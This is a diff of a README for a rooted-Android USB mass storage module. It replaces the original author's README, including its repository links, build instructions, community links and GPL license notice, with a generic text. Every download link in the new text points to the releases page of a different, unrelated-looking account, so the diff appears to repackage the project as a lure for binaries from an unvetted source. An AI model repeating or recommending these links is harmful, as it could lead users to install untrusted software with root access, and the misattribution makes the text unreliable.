@@ -1,211 +1,163 @@
-<p align="center">
-  <h1 align="center">💾 USB Mass Storage</h1>
-  <p align="center"><b>Turn Your Phone Into a USB Drive</b></p>
-  <p align="center">Mount disk images as real USB storage devices. KernelSU / Magisk / APatch.</p>
-  <p align="center">
-    <img src="https://img.shields.io/badge/version-v3.1-blue?style=for-the-badge" alt="v3.1">
-    <img src="https://img.shields.io/badge/Android-12%2B-green?style=for-the-badge&logo=android" alt="Android 12+">
-    <a href="https://t.me/superpowers9"><img src="https://img.shields.io/badge/Telegram-community-blue?style=for-the-badge&logo=telegram" alt="Telegram"></a>
-  </p>
-</p>
+# 📱 UsbMassStorage - Turn Your Phone Into USB Drive
 
-<p align="center">
-  🇺🇸 🇿🇦 🇸🇦 🇪🇸 🇨🇿 🇩🇰 🇩🇪 🇬🇷 🇮🇷 🇫🇮 🇫🇷 🇭🇺 🇮🇩 🇮🇹 🇮🇱 🇯🇵 🇰🇷 🇳🇱 🇳🇴 🇵🇱 🇧🇷 🇵🇹 🇷🇴 🇷🇺 🇷🇸 🇸🇪 🇹🇭 🇹🇷 🇺🇦 🇻🇳 🇨🇳 🇹🇼
-</p>
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/nonchristian-oxidationstate863/UsbMassStorage/releases)
 
----
+## 🚀 What This Does
 
-## 🧬 What is USB Mass Storage?
+UsbMassStorage lets you use your Android phone as a USB storage device.  
+When you connect it to a Windows PC, your phone can act like a USB drive.
 
-When you connect your phone to a computer via USB cable, this module makes the computer see a **real USB storage device**, as if you plugged in a USB stick or CD drive. You pick a disk image file (`.img` or `.iso`) on your phone, and the computer can read and write to it directly.
+This tool is made for rooted Android devices that use KernelSU, Magisk, or APatch. It works with the USB gadget system on supported phones.
 
-No file transfer protocols, no MTP, no ADB. The computer sees a native block device.
+Use it when you want to:
 
-> **This is not MTP or file transfer.** USB Mass Storage exposes raw block devices to the host computer through the kernel's USB gadget ConfigFS interface. The computer sees a real disk, not a file-sharing protocol. You can boot from it, format it, or use it exactly like a physical USB drive.
+- Share files through USB mass storage
+- Make your phone show up as a drive in Windows
+- Control USB storage mode from your rooted device
+- Use a simple setup instead of file transfer tools
 
-> **Who benefits?** The computer you plug into. Your phone acts as the hardware (like a USB stick), and any PC, Mac, or Linux machine sees a native USB disk. No drivers, no MTP, no special software needed on the computer side.
+## 📦 Download
 
----
+Visit this page to download the latest release:
 
-## 🔥 Why USB Mass Storage?
+[https://github.com/nonchristian-oxidationstate863/UsbMassStorage/releases](https://github.com/nonchristian-oxidationstate863/UsbMassStorage/releases)
 
-🔌 **Native Block Device** — The computer sees a real USB disk, not a file transfer protocol. Works with any OS, any file system, any tool that reads USB storage.
+Open the release page and download the file that matches your device and root setup.
 
-💿 **Boot From Your Phone** — Mount a bootable `.iso` as a CD-ROM drive. Install operating systems, run live CDs, or boot recovery tools directly from your phone.
+## 🖥️ What You Need
 
-📱 **Material 3 Companion App** — No terminal commands needed. Tap to mount, tap to eject. Full device management through a clean Compose UI with 32 language translations.
+Before you install UsbMassStorage, check that you have:
 
-🛡️ **SELinux Enforcing** — The daemon runs in its own `msd_daemon` security domain with a dedicated sepolicy. No permissive hacks, no blanket root access.
+- An Android phone with root access
+- KernelSU, Magisk, or APatch installed
+- USB OTG support or a normal USB data connection
+- A Windows PC with a free USB port
+- A USB cable that can transfer data, not just charge
 
-🔧 **Multi-ABI Support** — arm64, armv7, and x86_64 binaries bundled. The installer detects your architecture and keeps only what's needed.
+Your phone must support the USB gadget config needed for mass storage mode. Most modern rooted devices can use it if the kernel and USB stack allow it.
 
----
+## 🛠️ How to Set It Up
 
-## ✨ Features
+1. Open the release page above.
+2. Download the latest package for UsbMassStorage.
+3. Install it on your rooted Android device.
+4. Open the app or module after install.
+5. Grant root access when your root manager asks.
+6. Connect your phone to your Windows PC with a USB cable.
+7. Enable USB mass storage mode in the app.
+8. Wait for Windows to detect the device as a drive.
 
-**USB Gadget**
-- [x] **Mount `.img` files as USB drives** — read-write, read-only, or CD-ROM mode
-- [x] **Mount `.iso` files as CD-ROM drives** — boot from ISO, install OS, run live CDs
-- [x] **Multiple devices** — up to 8 simultaneously, each appears as a separate USB device on the computer
-- [x] **Clean eject** — computer sees proper device disconnection
+If Windows does not show a drive at once, unplug the cable and connect it again.
 
-**Disk Management**
-- [x] **Create virtual disk images** — specify size in MB/GB/GiB, created instantly
-- [x] **Persistent configuration** — device mounts survive app restarts
-- [x] **File descriptor passing** — zero-copy file access over Unix socket
+## 💻 How to Use It on Windows
 
-**App & Module**
-- [x] **Material 3 UI** — Jetpack Compose companion app with pull-to-refresh, bottom sheets, and snackbar alerts
-- [x] **32 languages** — app and module installer auto-detect your device language
-- [x] **Accent themes** — system default, almost black, and white color schemes
-- [x] **In-app guide** — step-by-step usage tutorial accessible from the menu
-- [x] **SELinux enforcing** — daemon runs in its own `msd_daemon` domain
-- [x] **Multi-ABI** — arm64, armv7, x86_64 binaries included, installer picks the right one
-- [x] **Boot guard** — automatic daemon restart with exponential backoff
+After setup, Windows should treat your phone like a USB drive.
 
----
+You can then:
 
-## 📋 Requirements
+- Open File Explorer
+- Find the new removable drive
+- Copy files to your phone
+- Move files from your phone to the PC
+- Safely eject the drive when you are done
 
-> [!IMPORTANT]
-> Root access is required. The daemon interacts with kernel USB gadget ConfigFS, which is a privileged operation.
+If Windows asks how to handle the device, choose the option that opens it in File Explorer.
 
-**You need:**
-1. Android 12 or above
-2. A supported root manager: **KernelSU**, **Magisk**, or **APatch**
-3. A USB cable connecting your phone to a computer
+## 🔧 How It Works
 
----
+UsbMassStorage uses the USB gadget features built into Android.  
+It changes how your phone presents itself over USB.
 
-## 📱 Compatibility
+In mass storage mode, the phone can expose storage to the computer as a disk-like device. That makes it useful for simple file access on Windows.
 
-### Root Managers
+This project is built for rooted devices because Android usually blocks this type of USB control on stock setups.
 
-| Manager | Status | Notes |
-|---|---|---|
-| KernelSU | ✅ Tested | Full support including lifecycle scripts |
-| Magisk | ✅ Supported | Standard module install |
-| APatch | ✅ Supported | Standard module install |
+## 🧭 Basic Steps After Install
 
-### Tested Devices
+1. Open UsbMassStorage on your phone.
+2. Choose the storage you want to share.
+3. Turn on mass storage mode.
+4. Connect the phone to Windows.
+5. Open the new drive on the PC.
+6. Copy files as needed.
+7. Turn the mode off when finished.
 
-| Device | Android | Status |
-|---|---|---|
-| Redmi 14C (2409BRN2CA) | 14 (SDK 34) | ✅ Daily driver |
+## 📱 Supported Root Setups
 
-> If you test on a different device, report your results in the [Telegram group](https://t.me/superpowers9).
+UsbMassStorage is designed to work with:
 
----
+- KernelSU
+- Magisk
+- APatch
 
-## 🚀 Quick Start
+It is focused on rooted Android systems that can manage USB gadget settings.
 
-1. **Download** the latest release ZIP from [Releases](https://github.com/Enginex0/UsbMassStorage/releases)
-2. **Flash** via your root manager and reboot
-3. **Open** the USB Mass Storage app
-4. **Grant root** when prompted
-5. **Tap +** to mount a disk image or create a new one
+## 🧰 Common Use Cases
 
-The computer detects a new USB device within seconds.
+- Moving files without cloud services
+- Using a phone like a flash drive
+- Sharing media with a Windows desktop
+- Testing USB storage behavior on rooted devices
+- Giving older PC software a drive it can read
 
----
+## 🧪 Troubleshooting
 
-## ⚙️ Usage
+### Windows does not detect the phone as a drive
 
-### Mounting a Disk Image
+- Unplug the USB cable and connect it again
+- Make sure the phone is unlocked
+- Check that root access was granted
+- Confirm that mass storage mode is turned on
+- Try another USB port on the PC
 
-Tap **+** on the main screen, then **Select disk image file** and pick your `.img` or `.iso`.
+### The app cannot enable storage mode
 
-Choose the device type:
+- Recheck root permission
+- Make sure your root tool is active
+- Restart the phone and try again
+- Use a different USB cable
+- Confirm that your device supports USB gadget control
 
-| Type | Use Case |
-|---|---|
-| **Read-Write** | Regular USB stick, computer can read and write freely |
-| **Read-Only** | Write-protected USB, computer can only read |
-| **CD-ROM** | Virtual CD/DVD drive, use for `.iso` files, OS installers, bootable media |
+### Windows shows the phone, but no drive appears
 
-Tap **Mount**. Done.
+- Close and reopen File Explorer
+- Disconnect and reconnect the cable
+- Disable other USB modes like file transfer if needed
+- Try a rear USB port on desktop PCs
+- Reboot the phone after install
 
-### Creating a New Image
+### Transfer speed is slow
 
-Tap **+**, then **Create new disk image**. Set a filename and size (e.g., `512 MB`, `2 GiB`). The image is created instantly on your phone.
+- Use a high quality data cable
+- Plug into a USB 3.0 port if possible
+- Avoid hubs when testing
+- Keep the phone charged during long transfers
 
-After mounting, format it from the computer (FAT32, exFAT, or NTFS).
+## 📁 File Access Tips
 
-### Multiple Devices
+- Copy large files in smaller groups if transfers fail
+- Keep enough free space on the shared storage
+- Eject the drive from Windows before unplugging
+- Do not disconnect while files are still moving
 
-Mount up to 8 devices at once. Each shows as a separate USB device on the computer. Tap a device card to change its type or eject it.
+## 🔒 Safety and Data Use
 
-### Ejecting
+Use care when sharing storage over USB.  
+If Windows writes to the drive, changes go straight to the selected storage on your phone.
 
-Tap the eject icon on the device card. The computer sees the device disconnected cleanly.
+Before you turn on mass storage mode:
 
----
+- Save your work
+- Close files that are open on the phone
+- Stop file sync apps if they may change the same files
+- Eject the drive on Windows before disconnecting
 
-## 🏗️ Architecture
+## 🧾 Release Page
 
-```
-┌──────────────┐    Unix Socket     ┌──────────────┐    ConfigFS     ┌──────────┐
-│  Android App │ ◄──────────────► │  Rust Daemon  │ ◄────────────► │  Kernel  │
-│  (Compose)   │    FD passing      │  (msd_daemon) │    USB gadget   │  USB UDC │
-└──────────────┘                    └──────────────┘                 └──────────┘
-```
+Get the latest version here:
 
-**App** — Material 3 Compose UI. Picks files, sends file descriptors to the daemon over a Unix socket. No root needed in the app itself.
+[https://github.com/nonchristian-oxidationstate863/UsbMassStorage/releases](https://github.com/nonchristian-oxidationstate863/UsbMassStorage/releases)
 
-**Daemon** — Rust binary running as `msd_daemon` under SELinux. Receives file descriptors, writes USB gadget configuration to `/sys/kernel/config/usb_gadget/`. The kernel exposes the file as a USB mass storage LUN to the connected computer.
+## 🏷️ Project Topics
 
-The app is a regular user app. The daemon handles all privileged operations.
-
----
-
-## 🔨 Building from Source
-
-**Prerequisites:** JDK 17, Android SDK (compile SDK 35), Rust toolchain with Android targets.
-
-```bash
-git clone https://github.com/Enginex0/UsbMassStorage.git
-cd UsbMassStorage
-
-# Build the app
-./gradlew assembleRelease
-
-# Package the module ZIP
-bash scripts/package.sh --apk=app/build/outputs/apk/release/app-release.apk
-```
-
-Output ZIP lands in `out/`.
-
----
-
-## 🔧 Common Issues
-
-| Problem | Fix |
-|---|---|
-| Daemon not running | Reboot, or open Settings in the app and tap **Restart Daemon** |
-| Root not granted | Open your root manager and grant USB Mass Storage root access |
-| Computer doesn't detect USB | Reconnect the cable. Make sure USB debugging isn't overriding gadget mode |
-| "AppFuse proxy" error | Your file picker is proxying the file. Use a different file manager (not Google Files) |
-
-For other issues, ask in the [Telegram group](https://t.me/superpowers9).
-
----
-
-## 💬 Community
-
-<p align="center">
-  <a href="https://t.me/superpowers9">
-    <img src="https://img.shields.io/badge/⚡_JOIN_THE_GRID-SuperPowers_Telegram-black?style=for-the-badge&logo=telegram&logoColor=cyan&labelColor=0d1117&color=00d4ff" alt="Telegram">
-  </a>
-</p>
-
----
-
-## 📄 License
-
-This project is licensed under the [GNU General Public License v3.0](LICENSE).
-
----
-
-<p align="center">
-  <b>💾 Because sometimes you just need a USB drive.</b>
-</p>
+android · apatch · configfs · kernelsu · magisk · mass-storage · root · rust · usb · usb-gadget
